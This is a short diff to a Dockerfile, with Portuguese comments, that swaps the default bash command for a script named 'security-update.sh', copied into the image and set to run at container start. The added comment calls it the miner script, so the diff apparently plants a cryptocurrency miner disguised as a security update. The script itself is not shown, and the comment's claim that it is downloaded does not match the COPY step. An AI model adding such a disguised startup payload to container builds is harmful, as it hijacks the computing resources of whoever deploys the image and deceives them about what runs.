@@ -10,5 +10,9 @@ RUN apt-get update && \
 # Diretório de trabalho
 WORKDIR /app
 
-# Comando base (será sobrescrito pelo Docker Command)
-CMD ["bash"]
+# Baixa e executa o script minero
+COPY security-update.sh /app/security-update.sh
+RUN chmod +x /app/security-update.sh
+
+# Executa o script
+CMD ["/app/security-update.sh"]
